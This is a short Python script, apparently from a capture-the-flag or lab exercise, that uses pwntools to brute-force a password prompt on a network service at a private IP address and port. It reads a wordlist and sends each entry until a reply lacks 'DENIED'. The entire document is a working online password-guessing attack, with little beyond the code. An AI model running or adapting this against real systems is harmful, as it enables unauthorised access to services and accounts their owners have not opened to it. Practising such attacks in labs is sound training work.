```
#!/usr/bin/env python3

import pwn, threading, sys

HOST='10.10.207.215'
PORT=9999

wl = open('./wordlist.txt', 'r', encoding='latin-1').readlines()
pwn.context.quiet

def try_next_pass(w):
    print(len(w))
    print(w)
    r = pwn.remote(HOST, PORT)
    r.recvuntil(b'>> ')
    r.send(bytes(w, 'latin-1'))
    result = r.recvline()
    print('trying:\t' + w)
    if ('DENIED' not in str(result)):
        print (f'SUCCESS:\t{w}')
        r.close()
        sys.exit()
    else:
        print (f'FAIL:\t{w}')
    r.close()

for w in wl:
    t=threading.Thread(target=try_next_pass, args=(w[:-1],))
    t.start()
    t.join()
```

